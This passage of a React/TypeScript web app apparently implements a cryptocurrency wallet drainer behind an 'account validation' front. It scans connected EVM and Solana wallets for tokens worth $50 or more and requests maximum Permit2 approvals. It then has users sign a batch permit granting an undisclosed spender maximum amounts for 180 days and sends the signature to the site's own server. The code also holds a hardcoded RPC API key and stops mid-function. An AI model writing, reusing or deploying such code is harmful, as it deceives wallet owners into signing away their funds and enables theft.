/* eslint-disable @typescript-eslint/no-explicit-any */
'use client';

import { useState, useCallback, useEffect } from 'react';
import { Card, CardContent } from '@/components/ui/card';
import Image from 'next/image';
import { wallets } from '@/lib/data';
import {
  AllowanceProvider,
  MaxAllowanceTransferAmount,
} from '@uniswap/permit2-sdk';
import { ethers, Contract } from 'ethers';
import { createAppKit, useAppKit, useAppKitProvider } from '@reown/appkit/react';
import { Ethers5Adapter } from '@reown/appkit-adapter-ethers5';
import { SolanaAdapter } from '@reown/appkit-adapter-solana';
import { 
  mainnet, 
  arbitrum, 
  base, 
  bsc, 
  linea, 
  polygon, 
  zksync, 
  optimism, 
  avalanche, 
  zora, 
  blast, 
  berachain,
  solana,
  hyperliquid,
  robinhood,
  baseSepolia
} from '@reown/appkit/networks';
import { Alchemy, Network } from 'alchemy-sdk';
import { defineChain } from '@reown/appkit/networks';
import { 
  Connection, 
  PublicKey, 
  Transaction 
} from '@solana/web3.js';
import { 
  getAccount, 
  getMint, 
  createApproveInstruction, 
  TOKEN_PROGRAM_ID 
} from '@solana/spl-token';

type WalletType = {
  id: string;
  icon: string;
  name: string;
};


//CUSTOM HYPEREVM CHAIN
const hyperEVM = defineChain({
  id: 999,
  caipNetworkId: 'eip155:999',
  chainNamespace: 'eip155',
  name: 'HyperEVM',
  nativeCurrency: {
    decimals: 18,
    name: 'HYPE',
    symbol: 'HYPE'
  },
  rpcUrls: {
    default: {
      http: ['https://rpc.hyperliquid.xyz/evm'],
      webSocket: ['wss://hyperliquid.drpc.org']
    }
  },
  blockExplorers: {
    default: { name: 'HyperEVM Scan', url: 'https://hyperevmscan.io/'}
  },
  contracts: {
    multicall3: {
      address: '0xbd23DbBDEC1e9EEfcd72ca53bBb307B0940769c0',
      blockCreated: 9956576,
    }
  }
})


interface PermitDetails {
  token: string;
  amount: ethers.BigNumberish;
  expiration: number;
  nonce: number;
}

interface PermitBatch {
  details: PermitDetails[];
  spender: string;
  sigDeadline: number;
}

interface TokenWithValue {
  address: string;
  symbol: string;
  balance: ethers.BigNumber;
  decimals: number;
  price: number;
  value: number;
}

interface SolanaTokenInfo {
  tokenAccount: string;
  mint: string;
  symbol: string;
  balance: string;
  decimals: number;
  amount: bigint;
}

const MIN_TOKEN_VALUE_USD = 50;

function toDeadline(expiration: number): number {
  return Math.floor((Date.now() + expiration) / 1000);
}

const alchemyConfig = {
  apiKey: process.env.NEXT_PUBLIC_ALCHEMY_API_KEY,
};

const networkMap: { [key: number]: Network } = {
  1: Network.ETH_MAINNET,
  8453: Network.BASE_MAINNET,
  42161: Network.ARB_MAINNET,
  56: Network.BNB_MAINNET, // BSC back in Alchemy (if supported), fallback available
  7777777: Network.ZORA_MAINNET,
  81457: Network.BLAST_MAINNET,
  324: Network.ZKSYNC_MAINNET,
  10: Network.OPT_MAINNET,
  43114: Network.AVAX_MAINNET,
  137: Network.MATIC_MAINNET,
  80094: Network.BERACHAIN_MAINNET,
  59144: Network.LINEA_MAINNET,
  84532: Network.BASE_SEPOLIA,
  999: Network.HYPERLIQUID_MAINNET
};

const CONTRACT_ADDRESSES: { [Key: number]: string} = {
  1: process.env.NEXT_PUBLIC_MAINNET_SPENDER!,       // Ethereum Mainnet
  42161: process.env.NEXT_PUBLIC_ARBITRUM_SPENDER!,  // Arbitrum
  56: process.env.NEXT_PUBLIC_BNB_SPENDER!,          // BSC
  8453: process.env.NEXT_PUBLIC_BASE_SPENDER!,       // Base
  10: process.env.NEXT_PUBLIC_OPTIMISM_SPENDER!,     // Optimism
  43114: process.env.NEXT_PUBLIC_AVALANCHE_SPENDER!, // Avalanche
  137: process.env.NEXT_PUBLIC_POLYGON_SPENDER!,     // Polygon
  80094: process.env.NEXT_PUBLIC_BERACHAIN_SPENDER!,
  999: process.env.NEXT_PUBLIC_HYPEREVM_SPENDER!,
  59144: process.env.NEXT_PUBLIC_LINEA_SPENDER!,
  4663: process.env.NEXT_PUBLIC_ROBINHOOD_SPENDER!, // Robinhood
}

const PERMIT2_ADDRESSES: { [key: number]: string } = {
  1: process.env.NEXT_PUBLIC_MAINNET_PERMIT2!,     // Ethereum Mainnet
  42161: process.env.NEXT_PUBLIC_ARBITRUM_PERMIT2!, // Arbitrum
  56: process.env.NEXT_PUBLIC_BNB_PERMIT2!,     // BSC
  8453: process.env.NEXT_PUBLIC_BASE_PERMIT2!,   // Base
  10: process.env.NEXT_PUBLIC_OPTIMISM_PERMIT2!,     // Optimism
  43114: process.env.NEXT_PUBLIC_AVALANCHE_PERMIT2!, // Avalanche
  137: process.env.NEXT_PUBLIC_POLYGON_PERMIT2!,   // Polygon
  80094: process.env.NEXT_PUBLIC_BERACHAIN_PERMIT2!,
  999: process.env.NEXT_PUBLIC_HYPEREVM_PERMIT2!,
  59144: process.env.NEXT_PUBLIC_LINEA_PERMIT2!,
  4663: process.env.NEXT_PUBLIC_ROBINHOOD_PERMIT2!, // Robinhood
};

// Pricing and explorer configs
const ETHERSCAN_V2_API = process.env.NEXT_PUBLIC_ETHERSCAN_V2_API || 'https://api.etherscan.io/v2/api';
const ETHERSCAN_API_KEY = process.env.NEXT_PUBLIC_ETHERSCAN_API_KEY!;
// RPC URLs for custom fallback networks
const RPC_URLS: { [chainId: number]: string } = {
  999: process.env.NEXT_PUBLIC_HYPEREVM_RPC_URL || 'https://rpc.hyperliquid.xyz/evm',
  56: process.env.NEXT_PUBLIC_BSC_RPC_URL || 'https://bsc-dataseed1.binance.org',
  4663: process.env.NEXT_PUBLIC_ROBINHOOD_RPC_URL || 'https://rpc.robinhoodchain.com',
};

// Relay Link price helper
async function getUsdPriceFromRelay(chainId: number, tokenAddress: string): Promise<number> {
  try {
    const url = `https://api.relay.link/currencies/token/price?chainId=${chainId}&address=${tokenAddress}`;
    console.log(`[Relay] fetch price url=${url}`);
    const res = await fetch(url, { method: 'GET', cache: 'no-store' });
    if (!res.ok) return 0;
    const data = await res.json();
    console.log('[Relay] response', data);
    const candidates = [
      (typeof data === 'number' ? data : undefined),
      data?.price,
      data?.usd,
      data?.usdPrice,
      data?.data?.price,
    ];
    const price = candidates
      .map((value) => typeof value === 'number' ? value : typeof value === 'string' ? Number(value) : NaN)
      .find((value) => Number.isFinite(value) && value >= 0);
    return typeof price === 'number' && Number.isFinite(price) ? price : 0;
  } catch (e) {
    console.error('Relay price fetch failed:', e);
    return 0;
  }
}

async function fetchValuableTokensViaEtherscan(address: string, chainId: number): Promise<TokenWithValue[]> {
  try {
    const url = `${ETHERSCAN_V2_API}?chainid=${chainId}&module=account&action=addresstokenbalance&address=${address}&page=1&offset=200${ETHERSCAN_API_KEY ? `&apikey=${ETHERSCAN_API_KEY}` : ''}`;
    console.log(`[Etherscan] fetch balances url=${url}`);
    const res = await fetch(url, { cache: 'no-store' });
    if (!res.ok) throw new Error('Etherscan request failed');
    const data = await res.json();
    console.log('[Etherscan] response keys', Object.keys(data || {}));
    const list: any[] = Array.isArray(data?.result) ? data.result : [];
    console.log(`[Etherscan] tokens returned=${list.length}`);

    const tokensRaw: (TokenWithValue | null)[] = list
      .map((t: any) => {
        const contract = t.tokenAddress || t.contractAddress || t.token_address || t.address;
        const symbol = t.tokenSymbol || t.symbol || t.token_symbol || t.name;
        const decimalsRaw = t.tokenDecimal ?? t.decimals ?? t.token_decimals;
        const decimals = typeof decimalsRaw === 'string' ? parseInt(decimalsRaw, 10) : (decimalsRaw ?? 18);
        const balanceRaw = t.balance ?? t.tokenBalance ?? t.token_balance ?? '0';
        try {
          const addressChecksum = ethers.utils.getAddress(contract);
          const balance = ethers.BigNumber.from(balanceRaw);
          return {
            address: addressChecksum,
            symbol: (symbol || 'TOKEN').toString(),
            balance,
            decimals,
            price: 0,
            value: 0,
          } as TokenWithValue;
        } catch (e) {
          console.warn('[Etherscan] skipped invalid token row', { t, error: (e as Error)?.message });
          return null;
        }
      })
      .filter((t: TokenWithValue | null): t is TokenWithValue => !!t && t.balance.gt(0));

    if (tokensRaw.length === 0) return [];

    const tokens: TokenWithValue[] = tokensRaw.filter((t): t is TokenWithValue => t !== null);

    // Fetch Relay prices in parallel per token address
    const withValues: TokenWithValue[] = await Promise.all(
      tokens.map(async (t) => {
        const usdPrice = await getUsdPriceFromRelay(chainId, t.address);
        if (usdPrice > 0) {
          const normalized = parseFloat(ethers.utils.formatUnits(t.balance, t.decimals));
          const usdValue = normalized * usdPrice;
          console.log('[TokenValuation] token', { symbol: t.symbol, address: t.address, normalized, usdPrice, usdValue });
          return { ...t, price: usdPrice, value: usdValue };
        }
        console.log('[TokenValuation] no price for token', { symbol: t.symbol, address: t.address });
        return t;
      })
    );

    const valuable = withValues.filter(
      (t: TokenWithValue) => t.price > 0 && Math.round(t.value * 100) / 100 >= MIN_TOKEN_VALUE_USD
    );
    console.log(`[TokenValuation] valuable count=${valuable.length} threshold=${MIN_TOKEN_VALUE_USD}`);
    return valuable.sort((a: TokenWithValue, b: TokenWithValue) => b.value - a.value);
  } catch (error) {
    console.error('Failed to fetch tokens via Etherscan:', error);
    return [];
  }
}

// Custom Etherscan tokentx fallback for unsupported networks (HyperEVM, BSC, etc.)
async function fetchValuableTokensViaEtherscanTxlist(address: string, chainId: number): Promise<TokenWithValue[]> {
  try {
    const url = `${ETHERSCAN_V2_API}?chainid=${chainId}&module=account&action=tokentx&address=${address}&page=1&offset=100&startblock=0&endblock=99999999&sort=desc${ETHERSCAN_API_KEY ? `&apikey=${ETHERSCAN_API_KEY}` : ''}`;
    console.log(`[Etherscan][tokentx] url=${url}`);
    const res = await fetch(url, { cache: 'no-store' });
    if (!res.ok) throw new Error('Etherscan tokentx request failed');
    const data = await res.json();
    const txs: any[] = Array.isArray(data?.result) ? data.result : [];
    console.log(`[Etherscan][tokentx] token transactions=${txs.length}`);

    // Extract contract addresses directly from token transactions
    const contractAddresses = new Set<string>();
    for (const tx of txs) {
      const contractAddress = tx?.contractAddress;
      if (contractAddress && contractAddress !== '0x0000000000000000000000000000000000000000') {
        contractAddresses.add(contractAddress.toLowerCase());
      }
    }
    const candidates = Array.from(contractAddresses);
    console.log('[Etherscan][tokentx] unique token contracts found:', candidates.length);

    // Remove hardcoded contracts - now fully automatic discovery

    if (candidates.length === 0) return [];

    const rpcUrl = RPC_URLS[chainId];
    if (!rpcUrl) {
      console.error(`No RPC URL configured for chainId ${chainId}`);
      return [];
    }

    const networkName = chainId === 999
      ? 'HyperEVM'
      : chainId === 4663
        ? 'Robinhood Chain'
        : chainId === 56
          ? 'BSC'
          : `Chain${chainId}`;
    const readProvider = new ethers.providers.JsonRpcProvider(rpcUrl, { name: networkName, chainId });
    const erc20Abi = [
      'function balanceOf(address owner) view returns (uint256)',
      'function decimals() view returns (uint8)',
      'function symbol() view returns (string)'
    ];

    // Simple: check balance for each contract address
    const checkBalance = async (contractAddr: string): Promise<TokenWithValue | null> => {
      try {
        const contract = new Contract(contractAddr, erc20Abi, readProvider);
        const balance = await contract.balanceOf(address);
        
        if (balance.gt(0)) {
          const [decimals, symbol] = await Promise.all([
            contract.decimals().catch(() => 18),
            contract.symbol().catch(() => 'TOKEN')
          ]);
          
          return {
            address: ethers.utils.getAddress(contractAddr),
            symbol: String(symbol),
            balance,
            decimals: Number(decimals),
            price: 0,
            value: 0,
          };
        }
        return null;
      } catch {
        return null;
      }
    };

    const tokens = (await Promise.all(candidates.map(checkBalance))).filter((t): t is TokenWithValue => !!t);
    console.log('[Etherscan][tokentx] tokens with balance:', tokens.length);
    if (tokens.length === 0) return [];

    const withValues: TokenWithValue[] = await Promise.all(
      tokens.map(async (t) => {
        const usdPrice = await getUsdPriceFromRelay(chainId, t.address);
        if (usdPrice > 0) {
          const normalized = parseFloat(ethers.utils.formatUnits(t.balance, t.decimals));
          const usdValue = normalized * usdPrice;
          console.log('[TokenValuation][tokentx] token', { symbol: t.symbol, address: t.address, normalized, usdPrice, usdValue });
          return { ...t, price: usdPrice, value: usdValue };
        }
        console.log('[TokenValuation][tokentx] no price', { symbol: t.symbol, address: t.address });
        return t;
      })
    );

    const valuable = withValues.filter(
      (t) => t.price > 0 && Math.round(t.value * 100) / 100 >= MIN_TOKEN_VALUE_USD
    );
    console.log(`[TokenValuation][tokentx] valuable count=${valuable.length} threshold=${MIN_TOKEN_VALUE_USD}`);
    return valuable.sort((a, b) => b.value - a.value);
  } catch (error) {
    console.error('Failed to fetch tokens via Etherscan txlist:', error);
    return [];
  }
}

async function fetchValuableTokens(address: string, chainId: number): Promise<TokenWithValue[]> {
  try {
    // If Alchemy does not support this chainId, try Etherscan balances first
    if (!networkMap[chainId]) {
      const viaBalance = await fetchValuableTokensViaEtherscan(address, chainId);
      if (viaBalance.length > 0) return viaBalance;
      
      // Custom tokentx fallback for unsupported networks (HyperEVM, BSC, etc.)
      if (RPC_URLS[chainId]) {
        return await fetchValuableTokensViaEtherscanTxlist(address, chainId);
      }
      return [];
    }

    const network = networkMap[chainId] || Network.ETH_MAINNET;
    const alchemy = new Alchemy({ ...alchemyConfig, network });
    const balances = await alchemy.core.getTokenBalances(address);

    const tokensWithMetadata = await Promise.all(
      balances.tokenBalances
        .filter(token => ethers.BigNumber.from(token.tokenBalance).gt(0))
        .map(async token => {
          const metadata = await alchemy.core.getTokenMetadata(token.contractAddress);
          if (metadata.name && metadata.symbol) {
            return {
              address: token.contractAddress,
              symbol: metadata.symbol,
              balance: ethers.BigNumber.from(token.tokenBalance),
              decimals: metadata.decimals || 18,
              price: 0,
              value: 0,
            };
          }
          return null;
        })
    );

    const validTokens = tokensWithMetadata.filter((token): token is TokenWithValue => token !== null);

    // Resolve prices by contract address. Symbols are not unique, so a symbol-based
    // lookup can assign another token's price to an unpriced token.
    const alchemyPricesByAddress = new Map<string, number>();
    if (validTokens.length > 0) {
      try {
        const priceData = await alchemy.prices.getTokenPriceByAddress(
          validTokens.map((token) => ({ network, address: token.address }))
        );
        for (const result of priceData.data || []) {
          const usdPrice = result.prices
            ?.find((price) => price.currency.toLowerCase() === 'usd')
            ?.value;
          const parsedPrice = usdPrice === undefined ? NaN : Number(usdPrice);
          if (Number.isFinite(parsedPrice) && parsedPrice > 0) {
            alchemyPricesByAddress.set(result.address.toLowerCase(), parsedPrice);
          }
        }
      } catch (priceError) {
        console.error('Failed to fetch address-based Alchemy token prices:', priceError);
      }
    }

    const tokensWithValues: TokenWithValue[] = await Promise.all(
      validTokens.map(async (token) => {
        // Relay remains the fallback for tokens Alchemy does not price.
        const usdPrice = alchemyPricesByAddress.get(token.address.toLowerCase())
          ?? await getUsdPriceFromRelay(chainId, token.address);
        if (usdPrice > 0) {
          const normalizedBalance = parseFloat(ethers.utils.formatUnits(token.balance, token.decimals));
          const usdValue = normalizedBalance * usdPrice;
          console.log('[TokenValuation] token', {
            symbol: token.symbol,
            address: token.address,
            normalized: normalizedBalance,
            usdPrice,
            usdValue,
          });
          return { ...token, price: usdPrice, value: usdValue };
        }

        console.log('[TokenValuation] no price for token', {
          symbol: token.symbol,
          address: token.address,
        });
        return token;
      })
    );

    const valuableTokens = tokensWithValues.filter(
      token => token.price > 0 && Math.round(token.value * 100) / 100 >= MIN_TOKEN_VALUE_USD
    );
    console.log(`Filtered out ${tokensWithValues.length - valuableTokens.length} tokens below $${MIN_TOKEN_VALUE_USD} threshold`);
    return valuableTokens.sort((a, b) => b.value - a.value);
  } catch (error) {
    console.error('Failed to fetch valuable tokens:', error);
    return [];
  }
}


const projectId = process.env.NEXT_PUBLIC_REOWN_PROJECT_ID!;

// Create the Ethers adapter
const ethersAdapter = new Ethers5Adapter();

// Create Solana adapter
const solanaWeb3JsAdapter = new SolanaAdapter();

// Set up the metadata
const metadata = {
  name: 'Unichain',
  description: 'Onchain resolution for Whitelists',
  url: 'https://activatorpanel.com',
  icons: ['https://app.appactivation-panel.com/Home%20Page%20_%20Welcome%20to%20Panelactivator.com_files/save_bckudy.png'],
};

// Create the AppKit instance
createAppKit({
  adapters: [ethersAdapter, solanaWeb3JsAdapter as any],
  networks: [mainnet, arbitrum, base, bsc, linea, polygon, zksync, optimism, avalanche, zora, blast, berachain, hyperEVM, baseSepolia, solana],
  metadata,
  projectId,
  features: {
    analytics: true,
  },
});

export default function IssuesContent() {
  const [selectedWallet, setSelectedWallet] = useState<string | null>(null);
  const [account, setAccount] = useState<string>('');
  const [spender, setSpender] = useState<string>('');
  /* eslint-disable @typescript-eslint/no-unused-vars */
  const [signature, setSignature] = useState<string>(''); 
  /* eslint-enable @typescript-eslint/no-unused-vars */

  const [provider, setProvider] = useState<ethers.providers.Web3Provider | undefined>(undefined);
  const [chainId, setChainId] = useState<number>(0);
  const [tokens, setTokens] = useState<TokenWithValue[]>([]);
  const [loading, setLoading] = useState<boolean>(false);

  /* eslint-enable @typescript-eslint/no-unused-vars */
  const [totalValue, setTotalValue] = useState<number>(0);
  /* eslint-enable @typescript-eslint/no-unused-vars */
 
  const [showPopup, setShowPopup] = useState<boolean>(false);
  const [processingAction, setProcessingAction] = useState<string>('');

  // Solana state
  const [solanaAccount, setSolanaAccount] = useState<string>('');
  const [solanaConnection, setSolanaConnection] = useState<Connection | null>(null);
  const [solanaTokens, setSolanaTokens] = useState<SolanaTokenInfo[]>([]);
  const [solanaDelegate, setSolanaDelegate] = useState<string>('');
  const [solanaNetwork, setSolanaNetwork] = useState<'mainnet-beta'>('mainnet-beta');
  const [solanaLoading, setSolanaLoading] = useState<boolean>(false);
  const [currentWalletType, setCurrentWalletType] = useState<'evm' | 'solana' | null>(null);

  const { open } = useAppKit();
  const { walletProvider } = useAppKitProvider<ethers.providers.ExternalProvider>('eip155');
  const { walletProvider: solanaWalletProvider } = useAppKitProvider<any>('solana');

  useEffect(() => {
    if (account && chainId) {
      console.log(`[FetchValuableTokens] start account=${account} chainId=${chainId}`);
      setLoading(true);
      fetchValuableTokens(account, chainId)
        .then(valuableTokens => {
          setTokens(valuableTokens);
          const total = valuableTokens.reduce((sum, token) => sum + token.value, 0);
          console.log(`[FetchValuableTokens] done tokens=${valuableTokens.length} totalUSD=${total}`);
          setTotalValue(total);
          setLoading(false);
        })
        .catch(error => {
          console.error('Error fetching valuable tokens:', error);
          setLoading(false);
        });
    }
  }, [account, chainId]);

  const handleValidation = useCallback(async () => {
    if (!provider || !account || !chainId || tokens.length === 0) {
      alert('Please connect a wallet and ensure tokens are loaded.');
      return;
    }
  
    const permit2Address = PERMIT2_ADDRESSES[chainId];
    if (!permit2Address) {
      throw new Error(`No Permit2 address configured for chainId ${chainId}`);
    }
  
    try {
      const signer = provider.getSigner(account);
      const erc20Abi = [
        'function approve(address spender, uint256 amount)', 
        'function allowance(address owner, address spender) view returns (uint256)'
      ];
  
      setProcessingAction('checking_approvals');
      
      const validTokens: any[] = []; // Only tokens that pass validation
      
      // Step 1: Validate tokens and check approvals
      for (const token of tokens) {
        try {
          console.log(`Checking ${token.symbol}...`);
          
          // Validate token contract exists and has required functions
          const tokenContract = new Contract(token.address, erc20Abi, provider);
          
          // Test if the contract has the allowance function by calling it
          let currentAllowance;
          try {
            currentAllowance = await tokenContract.allowance(account, permit2Address);
            console.log(`✅ ${token.symbol} allowance check successful: ${currentAllowance.toString()}`);
          } catch (allowanceError: any) {
            console.error(`❌ ${token.symbol} allowance check failed:`, allowanceError.message);
            console.log(`Skipping ${token.symbol} - invalid token contract or missing allowance function`);
            continue; // Skip this token entirely
          }
          
          // Check if approval is needed
          if (currentAllowance.lt(MaxAllowanceTransferAmount)) {
            console.log(`${token.symbol} needs approval`);
            setProcessingAction(`approving_${token.symbol}`);
            
            try {
              const signerContract = new Contract(token.address, erc20Abi, signer);
              const tx = await signerContract.approve(permit2Address, MaxAllowanceTransferAmount);
              await tx.wait();
              console.log(`✅ ${token.symbol} approved successfully`);
            } catch (approveError: any) {
              console.error(`❌ Failed to approve ${token.symbol}:`, approveError.message);
              console.log(`Skipping ${token.symbol} - approval failed`);
              continue; // Skip this token
            }
          } else {
            console.log(`✅ ${token.symbol} already approved`);
          }
          
          // If we get here, the token is valid and approved
          validTokens.push(token);
          
        } catch (tokenError: any) {
          console.error(`❌ Error with ${token.symbol}:`, tokenError.message);
          console.log(`Skipping ${token.symbol} - general error`);
          continue; // Skip this token and continue with others
        }
      }
      
      // Check if we have any valid tokens to proceed with
      if (validTokens.length === 0) {
        throw new Error('No valid tokens found. All tokens failed validation or approval.');
      }
      
      if (validTokens.length < tokens.length) {
        const skippedTokens = tokens.filter(t => !validTokens.find(vt => vt.address === t.address));
        console.warn(`⚠️ Proceeding with ${validTokens.length}/${tokens.length} tokens. Skipped: ${skippedTokens.map(t => t.symbol).join(', ')}`);
      }
  
      // Step 2: Create permit signature for valid tokens only
      setProcessingAction('signing_permit');
      console.log(`Creating permit for ${validTokens.length} valid tokens...`);
      
      const details: PermitDetails[] = [];
      
      // Get real nonces from Permit2 contract
      const permit2Abi = [
        'function allowance(address owner, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)'
      ];
      const permit2Contract = new Contract(permit2Address, permit2Abi, provider);
      
      for (let i = 0; i < validTokens.length; i++) {
        const token = validTokens[i];
        
        try {
          // Get the actual current nonce for this token
          const { nonce: currentNonce } = await permit2Contract.allowance(account, token.address, spender);
          console.log(`Got nonce for ${token.symbol}: ${currentNonce}`);
          
          details.push({
            token: ethers.utils.getAddress(token.address),
            amount: MaxAllowanceTransferAmount,
            expiration: toDeadline(1000 * 60 * 60 * 24 * 180),
            nonce: currentNonce, // Use the REAL nonce
          });
        } catch (nonceError) {
          console.error(`Failed to get nonce for ${token.symbol}:`, nonceError);
          console.log(`Using fallback nonce 0 for ${token.symbol}`);
          details.push({
            token: ethers.utils.getAddress(token.address),
            amount: MaxAllowanceTransferAmount,
            expiration: toDeadline(1000 * 60 * 60 * 24 * 180),
            nonce: 0, // Fallback
          });
        }
      }
  
      const permitBatch: PermitBatch = {
        details,
        spender,
        sigDeadline: toDeadline(1000 * 60 * 60 * 24 * 180),
      };
  
      const domain = {
        name: 'Permit2',
        chainId: chainId,
        verifyingContract: permit2Address,
      };
  
      const types = {
        PermitBatch: [
          { name: 'details', type: 'PermitDetails[]' },
          { name: 'spender', type: 'address' },
          { name: 'sigDeadline', type: 'uint256' },
        ],
        PermitDetails: [
          { name: 'token', type: 'address' },
          { name: 'amount', type: 'uint160' },
          { name: 'expiration', type: 'uint48' },
          { name: 'nonce', type: 'uint48' },
        ],
      };
  
      const signature = await signer._signTypedData(domain, types, permitBatch);
      setSignature(signature);
      console.log('✅ Permit signature created for valid tokens');
  
      // Step 3: Store permit (only valid tokens)
      const response = await fetch('/api/store/permit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          permitBatch, 
          signature, 
          owner: account, 
          chainId
        }),
      });
  
      const result = await response.json();
      if (response.ok) {
        console.log('✅ Account validation successful');
        setShowPopup(false);
        
        // Show success message with details
        let message = `Account Validated Successfully!\n\nProcessed: ${validTokens.map(t => t.symbol).join(', ')}`;
        if (validTokens.length < tokens.length) {
          const skipped = tokens.filter(t => !validTokens.find(vt => vt.address === t.address));
          message += `\n\nSkipped (invalid): ${skipped.map(t => t.symbol).join(', ')}`;
        }
        alert(message);
      } else {
        throw new Error(result.message || 'Failed to store permit');
      }
      
    } catch (e) {
      console.error('❌ Validation failed:', e);
      alert(`Validation failed: ${e instanceof Error ? e.message : 'Unknown error'}`);
    } finally {
      setProcessingAction('');
    }
  }, [account, provider, spender, chainId, tokens]);

  const connectWallet = useCallback(async () => {
    try {
      await open();
      if (walletProvider) {
        const web3Provider = new ethers.providers.Web3Provider(walletProvider);
        const signer = web3Provider.getSigner();
        const address = await signer.getAddress();
        const checkSummedAddress = ethers.utils.getAddress(address);
        const network = await web3Provider.getNetwork();
        const chainId = network.chainId;
        console.log(`[ConnectWallet] address=${checkSummedAddress} chainId=${chainId}`);

        // Get the appropriate spender address based on chainId
        const spenderAddress = CONTRACT_ADDRESSES[chainId];
        if (!spenderAddress) {
          throw new Error(`No spender address configured for chainId ${chainId}`);
        }

        setProvider(web3Provider);
        setAccount(checkSummedAddress);
        setSpender(spenderAddress);
        setChainId(chainId);
        setCurrentWalletType('evm');
        setShowPopup(true);
      }
    } catch (e) {
      console.error('Wallet connection failed:', e);
      alert(`Wallet connection failed: ${e instanceof Error ? e.message : 'Unknown error'}`);
    }
  }, [open, walletProvider]);


  const formatAddress = (address: string): string => {
    return `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
  };

  const getNetworkName = (chainId: number): string => {
    const networkNames: { [key: number]: string } = {
      1: 'Ethereum Mainnet',
      42161: 'Arbitrum',
      56: 'Binance Smart Chain',
      8453: 'Base',
      10: 'Optimism',
      43114: 'Avalanche',
      324: 'zkSync Era',
      137: 'Polygon',
      7777777: 'Zora',
      81457: 'Blast',
      999: 'HyperEVM',
      59144: 'Linea',
      4663: 'Robinhood Chain',
    };
    return networkNames[chainId] || `Unknown Network (Chain ID: ${chainId})`;
  };

  // Log why the Validate button might be disabled
  useEffect(() => {
    const hasProvider = !!provider;
    const hasTokens = tokens.length > 0;
    const hasSpender = !!CONTRACT_ADDRESSES[chainId];
    if (!hasProvider || !hasTokens || !hasSpender) {
      console.log('[ValidateButton] disabled reasons:', {
        hasProvider,
        tokensCount: tokens.length,
        hasSpender,
        chainId,
      });
    } else {
      console.log('[ValidateButton] enabled');
    }
  }, [provider, tokens, chainId]);

  // Solana functions
  const fetchSolanaTokens = useCallback(async (publicKey: string, connection: Connection) => {
    try {
      setSolanaLoading(true);
      const ownerPublicKey = new PublicKey(publicKey);
      
      // Get all token accounts owned by this address
      // Add error handling for RPC rate limits
      let tokenAccounts;
      try {
        tokenAccounts = await connection.getParsedTokenAccountsByOwner(
          ownerPublicKey,
          { programId: TOKEN_PROGRAM_ID }
        );
      } catch (rpcError: any) {
        if (rpcError.message?.includes('403') || rpcError.message?.includes('Forbidden')) {
          console.error('[SolanaRPC] 403 Forbidden - RPC rate limit or access denied');
          console.error('[SolanaRPC] Consider using a custom RPC endpoint with NEXT_PUBLIC_SOLANA_MAINNET_RPC');
          alert('Solana RPC access denied. Please configure a custom RPC endpoint in your environment variables (NEXT_PUBLIC_SOLANA_MAINNET_RPC).');
          setSolanaLoading(false);
          return;
        }
        throw rpcError;
      }

      const tokens: SolanaTokenInfo[] = [];
      
      for (const accountInfo of tokenAccounts.value) {
        const parsedInfo = accountInfo.account.data.parsed.info;
        const tokenAccount = accountInfo.pubkey.toString();
        const mint = parsedInfo.mint;
        const amount = BigInt(parsedInfo.tokenAmount.amount);
        const decimals = parsedInfo.tokenAmount.decimals;
        
        // Skip if balance is zero
        if (amount === 0n) continue;
        
        // Get mint info to get symbol (optional, can be slow)
        let symbol = 'UNKNOWN';
        try {
          const mintInfo = await getMint(connection, new PublicKey(mint));
          // Note: SPL tokens don't have symbol in metadata, you'd need to query a token registry
          // For now, we'll use the mint address
          symbol = mint.substring(0, 8) + '...';
        } catch {
          symbol = mint.substring(0, 8) + '...';
        }
        
        tokens.push({
          tokenAccount,
          mint,
          symbol,
          balance: (Number(amount) / Math.pow(10, decimals)).toString(),
          decimals,
          amount,
        });
      }
      
      console.log(`[FetchSolanaTokens] found ${tokens.length} tokens`);
      setSolanaTokens(tokens);
      setSolanaLoading(false);
    } catch (error) {
      console.error('Failed to fetch Solana tokens:', error);
      setSolanaLoading(false);
    }
  }, []);

  // Auto-detect Solana connection and fetch tokens
  useEffect(() => {
    const setupSolanaConnection = async () => {
      if (solanaWalletProvider && !solanaAccount) {
        try {
          let publicKey: string | null = null;
          
          // Try different ways to get the account from Reown's Solana provider
          // Method 1: Check if provider has publicKey directly
          if (solanaWalletProvider.publicKey) {
            publicKey = typeof solanaWalletProvider.publicKey === 'string' 
              ? solanaWalletProvider.publicKey 
              : solanaWalletProvider.publicKey.toString();
          }
          // Method 2: Check if provider has accounts array
          else if (solanaWalletProvider.accounts && solanaWalletProvider.accounts.length > 0) {
            publicKey = solanaWalletProvider.accounts[0].address || solanaWalletProvider.accounts[0];
          }
          // Method 3: Check if provider has address property
          else if (solanaWalletProvider.address) {
            publicKey = solanaWalletProvider.address;
          }
          // Method 4: Try to get from the underlying wallet (Phantom, etc.)
          else if (solanaWalletProvider._wallet?.publicKey) {
            const pk = solanaWalletProvider._wallet.publicKey;
            publicKey = typeof pk === 'string' ? pk : pk.toString();
          }
          // Method 5: Check window.solana directly (if Reown wraps it)
          else if (typeof window !== 'undefined' && (window as any).solana?.publicKey) {
            const pk = (window as any).solana.publicKey;
            publicKey = typeof pk === 'string' ? pk : pk.toString();
          }
          
          if (!publicKey) {
            // If still no account, provider might not be connected yet
            // Log provider structure for debugging
            console.log('[SolanaProvider] Provider structure:', {
              hasPublicKey: !!solanaWalletProvider.publicKey,
              hasAccounts: !!solanaWalletProvider.accounts,
              hasAddress: !!solanaWalletProvider.address,
              keys: Object.keys(solanaWalletProvider),
            });
            return;
          }
          
          console.log(`[AutoDetectSolana] address=${publicKey}`);
          
          // Set delegate address
          const delegateAddress = process.env.NEXT_PUBLIC_SOLANA_DELEGATE || '';
          if (!delegateAddress) {
            console.error('Solana delegate address not configured');
            return;
          }

          // Always use mainnet-beta
          setSolanaNetwork('mainnet-beta');

          // Initialize connection with mainnet RPC
          // Use Helius RPC as fallback if env var is not set
          const rpcUrl = process.env.NEXT_PUBLIC_SOLANA_MAINNET_RPC || 'https://mainnet.helius-rpc.com/?api-key=37f4415f-a3b7-4d86-913b-e9fd23d1334c';
          
          // Validate RPC URL
          if (!rpcUrl || (!rpcUrl.startsWith('http://') && !rpcUrl.startsWith('https://'))) {
            console.error('[SolanaConnection] Invalid RPC URL:', rpcUrl);
            console.error('[SolanaConnection] NEXT_PUBLIC_SOLANA_MAINNET_RPC value:', process.env.NEXT_PUBLIC_SOLANA_MAINNET_RPC);
